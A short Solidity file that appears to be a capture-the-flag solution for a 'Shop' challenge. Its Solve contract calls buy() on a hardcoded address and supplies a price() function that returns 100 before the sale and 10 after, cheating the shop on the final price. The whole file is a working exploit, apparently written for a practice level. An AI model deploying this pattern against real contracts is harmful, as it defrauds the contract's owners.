// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Shop {
    function isSold() external view returns (bool);

    function buy() external;
}

contract Solve {
    Shop shop = Shop(0xa08C0BED31Cc47c778696545e8b84341b82d9a03);

    function solve() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 100;
        } else {
            return 10;
        }
    }
}
